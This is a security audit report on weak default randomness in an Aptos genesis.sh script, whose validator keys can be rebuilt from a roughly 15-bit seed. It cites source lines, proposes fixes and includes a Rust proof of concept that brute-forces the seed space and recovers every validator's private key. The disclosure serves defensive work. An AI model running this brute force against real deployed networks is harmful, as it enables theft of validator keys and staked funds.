# Audit Report

## Title
Weak Default Randomness in Genesis Key Generation Enables Complete Network Compromise Through Private Key Prediction

## Summary
The `genesis.sh` script uses Bash's `$RANDOM` variable (providing only ~15 bits of entropy) as the default seed for generating validator private keys. This allows an attacker to brute-force all possible seeds in seconds, derive all validator private keys, and completely compromise any network deployed using default settings. [1](#0-0) 

## Finding Description

The vulnerability exists in the key generation flow for automated validator deployments:

**1. Weak Default Seed in genesis.sh:**

The genesis script defaults to using Bash's `$RANDOM` variable when `RANDOM_SEED` environment variable is not set: [1](#0-0) 

Bash's `$RANDOM` returns pseudo-random integers between 0 and 32767, providing only approximately 15 bits of entropy. The script acknowledges this is problematic with a TODO comment but uses it anyway: [2](#0-1) 

**2. Deterministic Key Derivation:**

For each validator, the script generates keys using an incrementally derived seed: [3](#0-2) 

Each validator's seed is simply `RANDOM_SEED + validator_index`, making all keys derivable from a single weak seed.

**3. No Seed Validation:**

The `RngArgs` struct accepts arbitrary seeds through the `--random-seed` CLI flag with only a comment warning, but no runtime validation: [4](#0-3) 

The `key_generator()` method accepts any hex-encoded seed without checking its entropy: [5](#0-4) 

**4. Underlying Cryptographic Flow:**

The weak seed flows through to BLS12381 key generation. While the `PrivateKey::generate()` implementation itself requires a cryptographically secure RNG: [6](#0-5) 

The security depends entirely on the quality of the RNG provided by the caller. When `KeyGen::from_seed()` is used with a weak seed, the resulting `StdRng` is deterministic and produces predictable output: [7](#0-6) 

**Attack Execution:**

1. Attacker observes validator public keys (publicly available for network operation)
2. For each candidate seed s ∈ [0, 32767]:
   - For each validator index i ∈ [0, NUM_VALIDATORS):
     - Generate keys using seed = s + i
     - Compare generated public keys against observed keys
3. When a match is found, attacker possesses all validator private keys
4. Attacker can sign blocks, violate consensus, and steal staked funds

This breaks the **Cryptographic Correctness** invariant: "BLS signatures, VRF, and hash operations must be secure."

## Impact Explanation

This vulnerability achieves **Critical** severity under the Aptos bug bounty criteria:

1. **Loss of Funds**: Attacker gains control of validator private keys, enabling theft of all staked validator funds

2. **Consensus/Safety Violations**: With validator keys, attacker can sign malicious blocks, cause equivocation, and violate BFT safety guarantees

3. **Non-recoverable Network Partition**: Network deployed with compromised keys cannot be salvaged without complete redeployment (new genesis)

4. **Complete Network Compromise**: Attacker controls sufficient validators to exceed the 1/3 Byzantine fault tolerance threshold

The impact affects any network deployed using `genesis.sh` with default settings, including testnets, devnets, and potentially production deployments using automated tooling.

## Likelihood Explanation

**HIGH likelihood** for networks deployed via automated scripts:

- The genesis.sh script is part of the official Terraform/Helm deployment infrastructure, suggesting intended production use
- The vulnerability requires zero privileged access - only observation of public keys
- Brute-forcing 32,768 seeds is trivial (completes in seconds on commodity hardware)
- The TODO comment indicates developers are aware but haven't fixed it
- No warnings are displayed when the script runs with default settings

**MEDIUM-LOW likelihood** for mainnet:

- Official deployment guides (AWS/GCP READMEs) show manual key generation without `--random-seed` flag
- Production validators following documentation use OS randomness

However, the vulnerability's presence in production code with no enforcement against weak seeds creates systemic risk.

## Recommendation

**Immediate fixes:**

1. **Reject weak seeds at runtime:**

```rust
// In crates/aptos/src/common/types.rs
pub fn key_generator(&self) -> CliTypedResult<KeyGen> {
    if let Some(ref seed) = self.random_seed {
        let seed = seed.strip_prefix("0x").unwrap_or(seed);
        let mut seed_slice = [0u8; 32];
        hex::decode_to_slice(seed, &mut seed_slice)?;
        
        // SECURITY: Validate seed has sufficient entropy
        // Check for common weak patterns (all zeros, sequential, etc.)
        if is_weak_seed(&seed_slice) {
            return Err(CliError::CommandArgumentError(
                "Seed has insufficient entropy. Use OS randomness or a cryptographically secure seed.".to_string()
            ));
        }
        
        Ok(KeyGen::from_seed(seed_slice))
    } else {
        Ok(KeyGen::from_os_rng())
    }
}

fn is_weak_seed(seed: &[u8; 32]) -> bool {
    // Check for all zeros
    if seed.iter().all(|&b| b == 0) {
        return true;
    }
    // Check for insufficient entropy (simple heuristic: count unique bytes)
    let unique_bytes = seed.iter().collect::<std::collections::HashSet<_>>().len();
    unique_bytes < 16 // Require reasonable diversity
}
```

2. **Fix genesis.sh to require explicit seed:**

```bash
# In terraform/helm/genesis/files/genesis.sh
if [[ -z "${RANDOM_SEED}" ]]; then
    echo "ERROR: RANDOM_SEED environment variable must be set"
    echo "Generate a secure random seed with: RANDOM_SEED=\$(openssl rand -hex 32)"
    exit 1
fi
```

3. **Add runtime warnings for deterministic key generation:**

```rust
// In generate_keys command execution
if self.rng_args.random_seed.is_some() {
    eprintln!("WARNING: Using deterministic seed for key generation.");
    eprintln!("This should ONLY be used for testing. Production keys must use OS randomness.");
}
```

## Proof of Concept

```rust
// Proof of concept demonstrating key prediction attack
use aptos_crypto::{bls12381, Uniform};
use aptos_keygen::KeyGen;
use std::collections::HashMap;

fn main() {
    // Simulate a network deployed with genesis.sh using $RANDOM seed
    let actual_random_seed = 12345u32; // Simulated Bash $RANDOM value
    let num_validators = 4;
    
    // Generate "real" validator keys (as genesis.sh would)
    let mut real_public_keys = Vec::new();
    for i in 0..num_validators {
        let seed_value = actual_random_seed + i;
        let seed_bytes = format!("{:064x}", seed_value);
        let mut seed = [0u8; 32];
        hex::decode_to_slice(&seed_bytes, &mut seed).unwrap();
        
        let mut keygen = KeyGen::from_seed(seed);
        let private_key = keygen.generate_bls12381_private_key();
        let public_key = private_key.public_key();
        real_public_keys.push((i, public_key));
        println!("Validator {} public key: {:?}", i, public_key);
    }
    
    // Attacker brute-forces to find the seed
    println!("\n[ATTACKER] Brute-forcing seed space (0-32767)...");
    let target_public_key = &real_public_keys[0].1;
    
    for candidate_seed in 0u32..32768 {
        let seed_bytes = format!("{:064x}", candidate_seed);
        let mut seed = [0u8; 32];
        hex::decode_to_slice(&seed_bytes, &mut seed).unwrap();
        
        let mut keygen = KeyGen::from_seed(seed);
        let test_key = keygen.generate_bls12381_private_key();
        let test_public_key = test_key.public_key();
        
        if test_public_key == *target_public_key {
            println!("[ATTACKER] FOUND SEED: {}", candidate_seed);
            println!("[ATTACKER] Can now derive all validator keys!");
            
            // Demonstrate deriving all validator keys
            for i in 0..num_validators {
                let validator_seed = candidate_seed + i;
                let seed_bytes = format!("{:064x}", validator_seed);
                let mut seed = [0u8; 32];
                hex::decode_to_slice(&seed_bytes, &mut seed).unwrap();
                
                let mut keygen = KeyGen::from_seed(seed);
                let private_key = keygen.generate_bls12381_private_key();
                println!("[ATTACKER] Validator {} private key compromised", i);
            }
            break;
        }
    }
}
```

**Expected output:**
```
Validator 0 public key: [hex data]
Validator 1 public key: [hex data]
...
[ATTACKER] Brute-forcing seed space (0-32767)...
[ATTACKER] FOUND SEED: 12345
[ATTACKER] Can now derive all validator keys!
[ATTACKER] Validator 0 private key compromised
[ATTACKER] Validator 1 private key compromised
...
```

**Attack complexity:** O(32768 × NUM_VALIDATORS) key generations, completing in seconds.

## Notes

This vulnerability demonstrates a critical failure in defense-in-depth: while the cryptographic primitives are secure, the tooling layer allows and even defaults to insecure usage patterns. The presence of a TODO comment acknowledging the issue but leaving it unfixed represents a significant security debt. Any network deployed using default genesis.sh settings is immediately and completely compromised.

### Citations

**File:** terraform/helm/genesis/files/genesis.sh (L25-25)
```shellscript
# TODO: Fix the usage of this below when not set
```

**File:** terraform/helm/genesis/files/genesis.sh (L26-26)
```shellscript
RANDOM_SEED=${RANDOM_SEED:-$RANDOM}
```

**File:** terraform/helm/genesis/files/genesis.sh (L112-118)
```shellscript
  if [[ -z "${RANDOM_SEED}" ]]; then
    aptos genesis generate-keys --output-dir $user_dir
  else
    seed=$(printf "%064x" "$((${RANDOM_SEED_IN_DECIMAL} + i))")
    echo "seed=$seed for ${i}th validator"
    aptos genesis generate-keys --random-seed $seed --output-dir $user_dir
  fi
```

**File:** crates/aptos/src/common/types.rs (L563-569)
```rust
    /// The seed used for key generation, should be a 64 character hex string and only used for testing
    ///
    /// If a predictable random seed is used, the key that is produced will be insecure and easy
    /// to reproduce.  Please do not use this unless sufficient randomness is put into the random
    /// seed.
    #[clap(long)]
    random_seed: Option<String>,
```

**File:** crates/aptos/src/common/types.rs (L593-604)
```rust
    pub fn key_generator(&self) -> CliTypedResult<KeyGen> {
        if let Some(ref seed) = self.random_seed {
            // Strip 0x
            let seed = seed.strip_prefix("0x").unwrap_or(seed);
            let mut seed_slice = [0u8; 32];

            hex::decode_to_slice(seed, &mut seed_slice)?;
            Ok(KeyGen::from_seed(seed_slice))
        } else {
            Ok(KeyGen::from_os_rng())
        }
    }
```

**File:** crates/aptos-crypto/src/bls12381/bls12381_keys.rs (L157-171)
```rust
impl Uniform for PrivateKey {
    fn generate<R>(rng: &mut R) -> Self
    where
        R: ::rand::RngCore + ::rand::CryptoRng,
    {
        // CRYPTONOTE(Alin): This "initial key material (IKM)" is the randomness used inside key_gen
        // below to pseudo-randomly derive the secret key via an HKDF
        // (see <https://datatracker.ietf.org/doc/html/draft-irtf-cfrg-bls-signature#section-2.3>)
        let mut ikm = [0u8; 32];
        rng.fill_bytes(&mut ikm);
        let privkey =
            blst::min_pk::SecretKey::key_gen(&ikm, &[]).expect("ikm length should be higher");
        Self { privkey }
    }
}
```

**File:** crates/aptos-keygen/src/lib.rs (L20-23)
```rust
    /// Constructs a key generator with a specific seed.
    pub fn from_seed(seed: [u8; 32]) -> Self {
        Self(StdRng::from_seed(seed))
    }
```
